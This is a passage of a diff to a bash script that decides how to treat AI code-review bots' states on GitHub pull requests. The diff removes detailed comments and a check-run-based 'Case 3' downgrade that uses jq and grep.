-  # rate-limit notices as ISSUE COMMENTS, not /reviews bodies (44 of 47 limit
-  # events observed Jun–Jul 2026 were issue comments), so `last_body` above
-  # never sees them and the ledger loops in vain (each wait-round costs ~15 min
-  # and risks a max-wait bail) for a review the rate-limited bot will not
-  # deliver.
-  #
-  # The detection (canonical-latest issue comment, notice-only regex, strict
-  # post-anchor freshness, fail-closed when unanchored) lives in
-  # _fresh_rate_limit_notice() so Tier E's #294 non-success guard and this Case 1b
-  # downgrade classify a rate-limited bot identically. Same ever_approved==0 outer
-  # guard as Case 1. Also reachable via fall-through from Tier E when CodeRabbit's
-  # legacy commit-status for HEAD is non-success (#294).
-  if _fresh_rate_limit_notice; then
     echo "none"; exit 0
   fi
   # Case 2: one-and-done COMMENTED — bot reviewed a prior commit with a
@@ -2154,80 +1317,6 @@ if [ "$ever_approved" -eq 0 ]; then
   # downgraded to `none` once HEAD advances past the reviewed commit.
   if [ "$last_state" = "COMMENTED" ] && \
      printf '%s' "$last_body" | grep -qiE '## (PR|Pull request) overview|PR overview summary'; then
-    echo "none"; exit 0
-  fi
-  # Case 3: check-run skipped on HEAD + COMMENTED state + non-actionable body
-  # — bot saw HEAD via a check-run but its conclusion is `skipped`. Canonical
-  # case: cubic-dev-ai on merge commits. After `gh pr update-branch` creates
-  # a merge commit, cubic emits a check-run with conclusion=skipped on the
-  # merge commit's SHA while its only `success` check-run stays anchored to
-  # the pre-merge commit. Tier D above (which requires conclusion=success)
-  # doesn't match HEAD, the downgrade block runs, and without this case it
-  # falls through to `echo stale` (cubic posts a "No issues found" COMMENTED
-  # review body that matches neither Case 1's error patterns nor Case 2's
-  # PR-overview regex), deadlocking invariant 2 indefinitely.
-  #
-  # Four-predicate guard:
-  # (a) Same ever_approved==0 outer guard as Cases 1 and 2 — a bot with prior
-  #     APPROVED / DISMISSED / CHANGES_REQUESTED never reaches this block, so
-  #     the [CHANGES_REQUESTED, skipped-HEAD] history correctly stays `stale`.
-  # (b) last_state == COMMENTED — implies the bot has at least one /reviews
-  #     entry whose body we can inspect. Rules out body_sha-only bots (e.g.,
-  #     a hypothetical Greptile variant that posts findings as issue-comment
-  #     bodies with body-SHA-reference links but no /reviews entries). For
-  #     such bots `last_state` is empty and `last_body` is empty — without
-  #     this guard, Case 3 would fire on the empty body and silently
-  #     downgrade actionable issue-comment findings to `none`. Mirrors
-  #     Case 2 which already requires COMMENTED state.
-  # (c) body_sha is empty — rules out bots whose actionable content lives in
-  #     issue-comment bodies referenced via body-SHA links, including mixed
-  #     shapes where a non-actionable /reviews body coexists with actionable
-  #     issue-comment content.
-  # (d) Positive-signal body guard — only downgrade when last review body is
-  #     empty OR CONTAINS a known non-actionable phrase as a substring. Without
-  #     (d), a bot with an actionable COMMENTED finding ("please fix line 47")
-  #     plus a later skipped-HEAD check-run would silently downgrade to `none`,
-  #     discarding the actionable signal. Mirrors Case 2's PR-overview guard
-  #     for the same risk shape.
-  #
-  #     Substring match (not anchored `^...$`) is required to handle real-world
-  #     bot bodies that wrap the phrase in markdown and footers. Canonical
-  #     example (cubic-dev-ai, observed PR #137): `**No issues found** across
-  #     1 file\n\n<sub>[Re-trigger cubic](...)</sub>\n\n<!-- cubic:* -->`.
-  #     Newlines are normalized to spaces by the `gsub("\n"; " ")` in the
-  #     read block above (where `last_body` is assigned) before this regex
-  #     runs. Semantic anchor — absolute line shifts when resolver/comment
-  #     blocks are added.
-  #
-  #     Accepted false-negative: a body like "no issues found but please fix X"
-  #     would match the substring and downgrade to `none`, discarding the
-  #     actionable "but" clause. We accept this because guards (a)/(b)/(c)
-  #     above (ever_approved==0, COMMENTED state, no body_sha) make accidental
-  #     matches on actionable-finding bodies rare in practice, and Tier A's
-  #     unresolved-thread check above catches the inline-comment variant.
-  #
-  # The skipped-check-run jq query filters by HEAD inside the predicate (not
-  # `last | head_sha` then bash-side check). This is pagination-order
-  # resilient: if the slurped check-runs array contains both a HEAD-skipped
-  # entry and a stale-skipped entry in any order, the predicate still matches
-  # the HEAD entry. The bash-side check becomes a count > 0 test.
-  #
-  # Mapping to `none` (not HEAD_SHA) preserves the semantic distinction:
-  # "bot acknowledged HEAD via check-run but declined to review" is not the
-  # same as "bot approved HEAD". Same precedent as Case 1.
-  #
-  # Reachability: bots with zero review history (no /reviews entry, no body
-  # SHA reference) exit via the empty-commit_id/empty-body_sha early-return
-  # between Tier D and this downgrade block with `none` before reaching here.
-  # Case 3 only applies to bots that have at least one prior /reviews entry
-  # in COMMENTED state. Citing the semantic anchor instead of an absolute
-  # line number — the line shifts when resolver/comment blocks are added
-  # (same brittle-line-number trap fixed in Tests 18 and 25's docstrings).
-  check_run_skipped_head_count=$(printf '%s' "$ALL_CHECK_RUNS" | jq -rs --arg login "$login" --arg head8 "$HEAD_SHA" \
-    '[.[].check_runs[] | select(.app.slug == $login) | select(.conclusion == "skipped") | select((.head_sha[0:8]) == $head8)] | length' 2>/dev/null || echo 0)
-  if [ "$check_run_skipped_head_count" -gt 0 ] && [ "$last_state" = "COMMENTED" ] && [ -z "$body_sha" ] && \
-     { [[ -z "$last_body" ]] || \
-       printf '%s' "$last_body" | grep -qiE '(no issues? found|no concerns|all good|looks good|lgtm|nothing to (add|report)\b)'; }; then
     echo "none"; exit 0
   fi
 fi
